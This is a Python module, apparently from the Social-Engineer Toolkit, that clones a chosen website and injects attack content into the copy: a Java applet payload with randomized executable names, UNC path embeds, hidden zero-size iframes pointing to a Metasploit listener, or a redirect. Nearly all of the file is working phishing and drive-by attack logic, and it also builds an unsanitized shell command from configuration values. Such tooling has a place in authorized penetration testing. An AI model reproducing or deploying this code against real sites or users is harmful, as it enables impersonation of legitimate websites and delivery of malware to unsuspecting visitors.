#!/usr/bin/env python
#########################################################################
# This file clones a website for SET to use in conjunction with the java
# applet attack.
#########################################################################
from src.core.setcore import *
import subprocess
import os
import sys
import time
import re
import shutil
import urllib2 

operating_system = check_os()
definepath=os.getcwd()

from config.set_config import USER_AGENT_STRING as user_agent
from config.set_config import WEB_PORT as web_port
from config.set_config import JAVA_ID_PARAM as java_id
from config.set_config import JAVA_REPEATER as java_repeater  #Boolean
from config.set_config import JAVA_TIME as java_time
from config.set_config import METASPLOIT_IFRAME_PORT as metasploit_iframe
from config.set_config import AUTO_REDIRECT as auto_redirect  #Boolean
from config.set_config import UNC_EMBED as unc_embed          #Boolean

track_email = check_config("TRACK_EMAIL_ADDRESSES=").lower()

## Open the IPADDR file
if not os.path.isfile("src/program_junk/interface"):
    fileopen=file("src/program_junk/ipaddr.file","r").readlines()
    for line in fileopen:
        line=line.rstrip()
        ipaddr=line

## Define base value
site_cloned = True

## grab interface ip address
if os.path.isfile("src/program_junk/interface"):
    fileopen=file("src/program_junk/interface", "r").readlines()
    for line in fileopen:
        line=line.rstrip()
        ipaddr=line

## GRAB DEFAULT PORT FOR WEB SERVER
meterpreter_iframe="8080"

## make dir if needed
if not os.path.isdir("src/program_junk/web_clone/"):
        os.makedirs("src/program_junk/web_clone")

## if we used a proxy configuration from the set-proxy
if os.path.isfile("src/program_junk/proxy.confg"):

    fileopen=file("src/program_junk/proxy.config", "r")
    proxy_config = fileopen.read().rstrip()

## just do a ls
if not os.path.isfile("src/program_junk/proxy.confg"): proxy_config = "ls"

## if counter == 0: web_port=80

webdav_meta=0
## see if exploit requires webdav
try:
    fileopen=file("src/program_junk/meta_config", "r")
    for line in fileopen:
        line=line.rstrip()
        match=re.search("set SRVPORT 80", line)
        if match:
            match2=re.search("set SRVPORT %s" % (metasploit_iframe), line)
            if not match2:
                webdav_meta=80
except:
    pass

template=""
## Grab custom or set defined
fileopen=file("src/program_junk/site.template","r").readlines()
for line in fileopen:
    line=line.rstrip()
    match=re.search("TEMPLATE=", line)
    if match:
        line=line.split("=")
        template=line[1]

## grab attack_vector specification
attack_vector=""
if os.path.isfile("src/program_junk/attack_vector"):
    fileopen=file("src/program_junk/attack_vector", "r").readlines()
    for line in fileopen:
        attack_vector=line.rstrip()

# generate a random string for obfsucation we will do the same for nix and mac bins

# windows executable random name
rand_gen_win = generate_random_string(6, 15)
# mac elf binary random name
rand_gen_mac = generate_random_string(6, 15)
# nix elf binary random name
rand_gen_nix = generate_random_string(6, 15)

try:
    ## open our config file that was specified in SET
    fileopen=file("src/program_junk/site.template", "r").readlines()
    ## start loop here
    url_counter=0
    for line in fileopen:
        line=line.rstrip()
        ## look for config file and parse for URL
        match=re.search("URL=",line)
        if match:
        ## replace the URL designator with nothing
            line=line.replace("URL=","")
            ## define url to clone here
            url=line.rstrip()

    ## if we aren't using multi attack with templates do this
    if url != "NULL":
        if template !="SET":
            print bcolors.YELLOW + "\n[*] Cloning the website: "+(url)
            print "[*] This could take a little bit..." + bcolors.ENDC

    ## clone the website
    if template != "SELF":
        ## clean up old stuff
        ## set counter
        counter=0
	# try except block in case no internet connection, route to Internet, etc.
	try:
		# check if we have wget, if we don't then use urllib2
		wget = 0
		if os.path.isfile("/usr/local/bin/wget"):
			wget = 1
		if os.path.isfile("/usr/bin/wget"):
			wget = 1
		if os.path.isfile("/usr/local/wget"):
			wget = 1

		if wget == 1:
			subprocess.Popen('%s;cd src/program_junk/web_clone/;wget --no-check-certificate -O index.html -c -k -U "%s" %s;' % (proxy_config,user_agent,url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

		if wget == 0:
			# if we don't have wget installed we will use python to rip, not as good as wget
			headers = { 'User-Agent' : user_agent }
			# read in the websites 
			req = urllib2.Request(url, None, headers)
			# read in the data from the initial request
			html = urllib2.urlopen(req).read()
			# if length isnt much then we didnt get the site cloned
			if len(html) > 1:
				# if the site has cloned properly
	        		site_cloned = True
				# open file for writing
				filewrite = file("src/program_junk/web_clone/index.html", "w")
				# write the data back from the request
				filewrite.write(html)
				# close the file
				filewrite.close()

	# if it failed ;(
	except:
		pass

        ## If the website did not clone properly, exit out.
        if not os.path.isfile("src/program_junk/web_clone/index.html"):
            print bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC
            return_continue()
            site_cloned = False
            ## add file to let set interactive shell know it was unsuccessful
            filewrite=file("src/program_junk/cloner.failed" , "w")
            filewrite.write("failed")
            filewrite.close()

	if os.path.isfile("src/program_junk/web_clone/index.html"):
		fileopen = file("src/program_junk/web_clone/index.html", "r")
		counter = 0
		for line in fileopen:
			counter = counter + 1
		if counter == 1 or counter == 0:
			print bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC
			return_continue()
			site_cloned = False
			os.remove("src/program_junk/web_clone/index.html")

	                ## add file to let set interactive shell know it was unsuccessful
        	        filewrite=file("src/program_junk/cloner.failed" , "w")
            		filewrite.write("failed")
            		filewrite.close()

        if site_cloned == True:

            ## make a backup of the site if needed
            shutil.copyfile("src/program_junk/web_clone/index.html", "src/program_junk/web_clone/index.html.bak")


    if site_cloned == True:

        ## java applet attack vector

        ## check for java flag for multi attack
        multi_java=False
        if os.path.isfile("src/program_junk/multi_java"):
            multi_java=True

        if attack_vector == "java" or multi_java:
                ## Here we parse through the new website and add our java applet code, its a hack for now
                ## Wrote this on the plane to Russia, easiest way to do this without internet access :P
                print bcolors.RED + "[*] Injecting Java Applet attack into the newly cloned website." + bcolors.ENDC
                ## Read in newly created index.html
                time.sleep(2)
                if not os.path.isfile("src/program_junk/web_clone/index.html"):
                        ## trigger error that we were unable to grab the website :(
                        print_error("Unable to clone the website it appears. Email us to fix.")
                        sys.exit()

                fileopen=file("src/program_junk/web_clone/index.html","r")
                ## Read add-on for java applet
                fileopen2=file("src/webattack/web_clone/applet.database" , "r")
                ## Write to new file with java applet added
                filewrite=file("src/program_junk/web_clone/index.html.new", "w")
                fileopen3=file("src/webattack/web_clone/repeater.database", "r")
                ## Open the UNC EMBED
                fileopen4=file("src/webattack/web_clone/unc.database", "r")

                ## this is our cloned website 
                index_database = fileopen.read()
                ## this is our applet database
                applet_database = fileopen2.read()
                ## this is our repeater database
                repeater_database = fileopen3.read()
                ## this is our unc database
                unc_database = fileopen4.read()

                ## here we begin replacing specifics in order to prep java applet payload
                applet_database = applet_database.replace("msf.exe", rand_gen_win)
		applet_database = applet_database.replace("mac.bin", rand_gen_mac)
		applet_database = applet_database.replace("nix.bin", rand_gen_nix)
		update_options("MSF.EXE=%s\nMAC.BIN=%s\nNIX.BIN=%s" % (rand_gen_win, rand_gen_mac, rand_gen_nix))

                ## close the file up
                applet_database = applet_database.replace("ipaddrhere", ipaddr + ":" + str(web_port))

                ## set the java field 
                applet_database = applet_database.replace("IDREPLACEHERE", java_id)

                ## set up everything for the unc path
                if unc_embed == True:
                        unc_database = unc_database.replace("IPREPLACEHERE", ipaddr)
                        unc_database = unc_database.replace("RANDOMNAME", rand_gen_win)

                ## set up the java repeater
                if java_repeater == True:
                        repeater_database = repeater_database.replace("IDREPLACEHERE", java_id)
                        repeater_database = repeater_database.replace("TIMEHEREPLZ", java_time)
                        repeater_database = repeater_database.replace("URLHEREPLZ", url)


                ## do a quick sanity check and make sure body is standard
                index_database = re.sub("</BODY.*?>", "</body>", index_database)
                index_database = re.sub("<HEAD.*?>", "<head>", index_database)
		index_database = re.sub("<BODY.*?>", "<body>", index_database)

                ## start appending and prepping the index file
                if java_repeater == True:
                        match = re.search("</body.*?>", index_database)
                        if match:
                                index_database = re.sub("<applet ", repeater_database + "\n<applet ", index_database)
                        if not match:
                                index_database = re.sub("<head.*?>", "\n<head>" + repeater_database, index_database)

                if unc_embed == True:
                        match = re.search("</body.*?>", index_database)
                        if match:
                                index_database = re.sub("</body.*?>", unc_database + "\n</body>", index_database)
                        if not match:
                                index_database = re.sub("<head.*?>", "\n<head>" + unc_database, index_database)

                counter = 0
                ## confirm we can find body
                match = re.search("</body.*?>", index_database)
                if match:
                        counter = 1
                        index_database = re.sub("</body.*?>", applet_database + "\n</body>", index_database)
			if auto_redirect == True:
                                index_database = index_database.replace('<param name="9" value=""', '<param name="9" value="%s"' % (url))
                if not match:
                        match = re.search("<head.*?>", index_database)
                        if match:
                                counter = 1
                                index_database = re.sub("<head.*?>", "\n<head>" + applet_database, index_database)
				if auto_redirect == True:
                                        index_database = index_database.replace('<param name="9" value=""', '<param name="9" value="%s"' % (url))

                ## start appending and prepping the index file
                if java_repeater == True:
                        match = re.search("</body.*?>", index_database)
                        if match:
                                index_database = re.sub("<applet", repeater_database + "\n<applet ", index_database)
                        if not match:
                                index_database = re.sub("<head.*?>", "\n<head>" + repeater_database, index_database)


                        if counter == 0:
                                print_error("Unable to clone the website...Sorry.")
                                print_error("This is usally caused by a missing body tag on a website.")
                                print_error("Try a diferent site and attempt it again.")                
                                sys.exit(1)               

                ## write the file out
                filewrite.write(index_database)

                ## close the file after done writing
                filewrite.close()

                print bcolors.BLUE + "[*] Filename obfuscation complete. Payload name is: " + rand_gen_win + "\n[*] Malicious java applet website prepped for deployment\n" + bcolors.ENDC

        ## selection of browser exploits
        ## check to see if multiattack is in use
        multi_meta="off"
        if os.path.isfile("src/program_junk/multi_meta"):
            multi_meta="on"

        if attack_vector == "browser" or multi_meta=="on":
            print bcolors.RED + "[*] Injecting iframes into cloned website for MSF Attack...." + bcolors.ENDC
            ## Read in newly created index.html
            if attack_vector == "multiattack":
                if os.path.isfile("src/program_junk/web_clone/index.html"): os.remove("src/program_junk/web_clone/index.html")
                shutil.copyfile("src/program_junk/web_clone/index.html.new", "src/program_junk/web_clone/index.html")
                time.sleep(1)
            fileopen=file("src/program_junk/web_clone/index.html","r").readlines()
            filewrite=file("src/program_junk/web_clone/index.html.new", "w")
            counter=0
            for line in fileopen:
                counter=0
                if attack_vector == "browser":
                    match=re.search("Signed_Update.jar", line)
                    if match:
                        line=line.replace("Signed_Update.jar", "invalid.jar")
                        filewrite.write(line)
                        counter=1

                match=re.search("<head.*?>", line, flags=re.IGNORECASE)
                if match:
                    header=match.group(0)

                match2=re.search("<head.*?>", line, flags=re.IGNORECASE)
                if match2:
                    header=match.group(0)
                    if webdav_meta != 80:
                        line=line.replace(header, header+'<iframe src ="http://%s:%s/" width="0" height="0" scrolling="no"></iframe>' % (ipaddr,metasploit_iframe))
                        filewrite.write(line)
                        counter=1
                    if webdav_meta == 80:
                        line=line.replace(header, header+'<head><meta HTTP-EQUIV="REFRESH" content="4; url=http://%s">' % (ipaddr))
                if counter == 0: filewrite.write(line)

            try: filewrite.close()
            except: pass
            print bcolors.BLUE + "[*] Malicious iframe injection successful...crafting payload.\n" + bcolors.ENDC


        if attack_vector == "java" or attack_vector == "browser" or attack_vector == "multiattack":
            if not os.path.isfile("src/program_junk/web_clone/Signed_Update.jar"):
                shutil.copyfile("src/html/Signed_Update.jar.orig", "src/program_junk/web_clone/Signed_Update.jar")
            ## move index.html to our main website
            if os.path.isfile("src/program_junk/web_clone/index.html.new"):
                shutil.move("src/program_junk/web_clone/index.html.new", "src/program_junk/web_clone/index.html")

## catch keyboard control-c
except KeyboardInterrupt:
    print ("Control-C detected, exiting gracefully...\n")
    exit_set()
